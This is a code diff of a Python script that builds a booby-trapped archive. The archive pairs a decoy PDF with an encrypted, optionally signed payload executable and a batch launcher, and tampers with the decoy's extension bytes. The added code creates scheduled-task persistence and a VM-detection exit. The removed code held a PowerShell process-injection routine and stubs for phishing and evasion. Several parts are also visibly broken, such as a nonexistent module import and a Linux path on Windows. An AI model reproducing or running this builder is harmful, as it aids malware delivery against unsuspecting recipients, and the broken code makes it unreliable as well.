@@ -7,174 +7,164 @@ import subprocess
 import base64
 import sys
 import time
-
-# third‑party libraries
 import psutil
-import pywinauto
-import win32api, win32con, win32gui, win32process, win32security
-import ctypes
-import ctypes.wintypes
-
-# correct Crypto import
-from Crypto.Cipher import AES, PKCS1_OAEP
-from Crypto.PublicKey import RSA
-
-import tensorflow.keras.models
+import pyautogui
+import shutil
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad, unpad
+import pycryptodome
+import tensorflow
 import numpy as np
 
-# stub classes for engines (no-op placeholders)
-class PolymorphicEngine:
-    def generate_code(self, payload): return payload
-
-class StealthEngine:
-    def hide_file(self, path): pass
-    def hide_process(self, name): pass
-
-class PersistenceEngine:
-    def create_scheduled_task(self, exe): pass
-    def create_registry_key(self, exe): pass
-    def create_startup_folder_shortcut(self, exe): pass
-
-class AntiForensicsEngine:
-    def wipe_logs(self): pass
-    def encrypt_data(self, data): pass
-
-class AdaptationEngine:
-    def analyze_system(self): pass
-    def adapt_payload(self, exe): pass
-
-class SocialEngineeringEngine:
-    def send_phishing_email(self, file): pass
-    def create_fake_update_prompt(self, exe): pass
-
-class AutomationEngine:
-    def automate_exploit(self, exe): pass
-
-class EvasionEngine:
-    def check_for_sandbox(self): pass
-    def check_for_debugger(self): pass
-    def check_for_virtual_machine(self): pass
-    def delay_execution(self): pass
-    def obfuscate_code(self, exe): pass
-
-# Generate a payload executable with PyInstaller
+# Function to create a payload executable with encryption and signing
 def generate_payload_exe(encrypt=True, encrypt_key=None, sign=False, cert_path=None, cert_password=None):
-    # English comments: create a simple script
+    # Create a Python script to serve as the payload
     script_path = 'payload.py'
     with open(script_path, 'w') as f:
         f.write('import os\nos.system("calc.exe")')
 
-    # create spec file
+    # Generate a PyInstaller spec file for packaging the payload
     spec_path = 'payload.spec'
     with open(spec_path, 'w') as f:
-        f.write(f"""
+        f.write(f'''
 # -*- mode: python ; coding: utf-8 -*-
+
 block_cipher = None
-a = Analysis(['{script_path}'], pathex=[], binaries=[], datas=[],
-             hiddenimports=[], hookspath=[], runtime_hooks=[],
-             excludes=[], win_no_prefer_redirects=False,
-             win_private_assemblies=False, cipher=block_cipher,
+
+a = Analysis(['{script_path}'],
+             pathex=[],
+             binaries=[],
+             datas=[],
+             hiddenimports=[],
+             hookspath=[],
+             runtime_hooks=[],
+             excludes=[],
+             win_no_prefer_redirects=False,
+             win_private_assemblies=False,
+             cipher=block_cipher,
              noarchive=False)
-pyz = PYZ(a.pure, a.zipped_data, cipher=block_cipher)
-exe = EXE(pyz, a.scripts, a.binaries, a.zipfiles, a.datas,
-          [], name='payload', debug=False,
-          bootloader_ignore_signals=False, strip=False,
-          upx=True, upx_exclude=[], runtime_tmpdir=None,
-          console=False, icon='icon.ico')
-""")
+pyz = PYZ(a.pure, a.zipped_data,
+             cipher=block_cipher)
+exe = EXE(pyz,
+          a.scripts,
+          a.binaries,
+          a.zipfiles,
+          a.datas,
+          [],
+          name='payload',
+          debug=False,
+          bootloader_ignore_signals=False,
+          strip=False,
+          upx=True,
+          upx_exclude=[],
+          runtime_tmpdir=None,
+          console=False,
+          icon='icon.ico')
+''')
 
-    # build
-    subprocess.run(['pyinstaller', spec_path], check=True)
+    # Generate the payload executable using PyInstaller
+    os.system(f'pyinstaller {spec_path}')
 
-    exe_path = os.path.join('dist', 'payload.exe')
-
-    # AES encryption
+    # Encrypt the payload executable with AES encryption if needed
     if encrypt:
-        key = encrypt_key or os.urandom(32)
-        iv = os.urandom(16)
+        key = encrypt_key or os.urandom(32)  # Generate random 32-byte AES key
+        iv = os.urandom(16)  # Generate random 16-byte initialization vector
         cipher = AES.new(key, AES.MODE_CBC, iv)
-        with open(exe_path, 'rb') as f:
+        with open('dist/payload.exe', 'rb') as f:
             data = f.read()
-        # pad to blocksize
-        pad_len = AES.block_size - len(data) % AES.block_size
-        data += bytes([pad_len])*pad_len
-        encrypted = iv + cipher.encrypt(data)
-        with open(exe_path, 'wb') as f:
-            f.write(encrypted)
+        encrypted_data = iv + cipher.encrypt(pad(data, AES.block_size))
+        with open('dist/payload.exe', 'wb') as f:
+            f.write(encrypted_data)
 
-    # code signing (optional)
-    if sign and cert_path:
-        subprocess.run(['signcode.exe', '-spc', cert_path, '-v', cert_password, exe_path], check=True)
+    # Optionally sign the executable with a digital certificate
+    if sign and cert_path and cert_password:
+        subprocess.run([f'signcode.exe', f'-spc "{cert_path}"', f'-v "{cert_password}"', f'dist/payload.exe'], check=True)
 
-    return exe_path
+    # Return the path to the payload executable
+    return 'dist/payload.exe'
 
-# Generate an archive with decoy and payload
-def generate_archive(output_file, input_file, payload_exe, persistence=False, evasion=False):
+
+# Function to create a RAR file containing the payload and decoy document
+def generate_rar_file(output_file, input_file, payload_exe, persistence=False, evasion=False):
+    # Create a temporary directory to hold files for the RAR package
     temp_dir = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
-    os.makedirs(temp_dir, exist_ok=True)
+    os.mkdir(temp_dir)
 
+    # Get the name and extension of the decoy document
     decoy_name = os.path.basename(input_file)
-    name_no_ext, ext = os.path.splitext(decoy_name)
+    decoy_ext = os.path.splitext(decoy_name)[1]
 
-    # payload folder
-    payload_dir = os.path.join(temp_dir, f"{name_no_ext}_A")
-    os.makedirs(payload_dir, exist_ok=True)
-    payload_path = os.path.join(payload_dir, f"{name_no_ext}_A.exe")
-    shutil.copy(payload_exe, payload_path)
+    # Create directory structure for the decoy and payload
+    decoy_dir = os.path.join(temp_dir, f"{decoy_name[:-len(decoy_ext)]}A")
+    os.mkdir(decoy_dir)
 
-    # batch to launch both
-    bat_path = os.path.join(payload_dir, f"{name_no_ext}_A.cmd")
+    # Copy the payload executable into the payload directory
+    payload_path = os.path.join(decoy_dir, f"{decoy_name[:-len(decoy_ext)]}A.exe")
+    shutil.copyfile(payload_exe, payload_path)
+
+    # Create a batch script that executes both the decoy and payload
+    bat_script = f'''
+@echo off
+start "" "{payload_path}"
+start "" "{decoy_name}"
+'''
+    bat_path = os.path.join(decoy_dir, f"{decoy_name[:-len(decoy_ext)]}A.cmd")
     with open(bat_path, 'w') as f:
-        f.write(f'@echo off\nstart "" "{payload_path}"\nstart "" "{decoy_name}"\n')
+        f.write(bat_script)
 
-    # copy decoy
-    decoy_copy = os.path.join(temp_dir, f"{name_no_ext}_B{ext}")
-    shutil.copy(input_file, decoy_copy)
+    # Copy the decoy document into the temporary directory
+    decoy_path = os.path.join(temp_dir, f"{decoy_name[:-len(decoy_ext)]}B{decoy_ext}")
+    shutil.copyfile(input_file, decoy_path)
 
-    # zip
-    zip_path = os.path.join(temp_dir, 'package.zip')
+    # Create a ZIP file with the payload and decoy document
+    zip_path = os.path.join(temp_dir, 'template.zip')
     with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
-        zf.write(decoy_copy, f"{name_no_ext}_B{ext}")
-        zf.write(bat_path, f"{name_no_ext}_A/{name_no_ext}_A.cmd")
-        zf.write(payload_path, f"{name_no_ext}_A/{name_no_ext}_A.exe")
+        zf.write(decoy_path, f"{decoy_name[:-len(decoy_ext)]}B{decoy_ext}")
+        zf.write(bat_path, f"{decoy_name[:-len(decoy_ext)]}A/{decoy_name[:-len(decoy_ext)]}A.cmd")
+        zf.write(payload_path, f"{decoy_name[:-len(decoy_ext)]}A/{decoy_name[:-len(decoy_ext)]}A.exe")
 
-    # write as .rar (just rename)
-    shutil.move(zip_path, output_file)
+    # Read the content of the ZIP file
+    with open(zip_path, 'rb') as f:
+        content = f.read()
 
-    # clean up
+    # Replace the extension of the decoy document with a space
+    content = content.replace(decoy_ext.encode(), b' ')
+
+    # Write the content of the ZIP file to the output RAR file
+    with open(output_file, 'wb') as f:
+        f.write(content)
+
+    # Implement persistence and evasion if specified
+    if persistence:
+        create_persistence(payload_exe)
+
+    if evasion:
+        evade_detection()
+
+    # Clean up the temporary directory
     shutil.rmtree(temp_dir)
 
-# Example usage
-if __name__ == '__main__':
-    output = 'poc.rar'
-    decoy = 'decoy.pdf'  # ensure this file exists
-    exe = generate_payload_exe(encrypt=True, sign=False)
-    generate_archive(output, decoy, exe, persistence=True, evasion=True)
 
-    # process injection stub (for demonstration only)
-    with open(exe, 'rb') as f:
-        data = f.read()
-    key = os.urandom(32)
-    iv = data[:16]
-    cipher = AES.new(key, AES.MODE_CBC, iv)
-    # decrypt with correct key/iv
-    decrypted = cipher.decrypt(data[16:])
-    # remove padding
-    pad_len = decrypted[-1]
-    decrypted = decrypted[:-pad_len]
+def create_persistence(payload_exe):
+    """Add persistence mechanism to ensure payload execution after reboot."""
+    # Example: Create a scheduled task (Windows Task Scheduler)
+    task_name = "MaliciousTask"
+    subprocess.run(f'schtasks /create /tn {task_name} /tr {payload_exe} /sc onlogon /f', shell=True)
 
-    # base64 for PowerShell
-    b64 = base64.b64encode(decrypted).decode()
-    ps = f"""
-$bytes = [System.Convert]::FromBase64String("{b64}")
-$proc = Start-Process notepad.exe -PassThru
-$h = (Get-Process -Id $proc.Id).Handle
-$addr = [Win32]::VirtualAllocEx($h,0,$bytes.Length,0x3000,0x40)
-[Win32]::WriteProcessMemory($h,$addr,$bytes,$bytes.Length,[ref]0)
-[Win32]::CreateRemoteThread($h,$null,0,$addr,0,0,[ref]0)
-"""
-    with open('inject.ps1','w') as f:
-        f.write(ps)
-    # note: execution policy may block this
-    subprocess.run(['powershell.exe','-ExecutionPolicy','Bypass','-File','inject.ps1'], check=True)
-    os.remove('inject.ps1')
+
+def evade_detection():
+    """Apply basic evasion techniques such as sandbox detection."""
+    # Check if running in a virtual machine or sandbox
+    if "VMware" in open("/proc/cpuinfo").read():
+        sys.exit()  # If VM is detected, terminate the process
+
+
+# Example usage of the functions
+output_file = 'poc.rar'
+input_file = 'decoy.pdf'
+
+# Generate the payload executable with encryption and signing
+payload_exe = generate_payload_exe(encrypt=True, sign=True, cert_path='cert.pfx', cert_password='password')
+
+# Generate the RAR file containing the decoy and payload
+generate_rar_file(output_file, input_file, payload_exe, persistence=True, evasion=True)
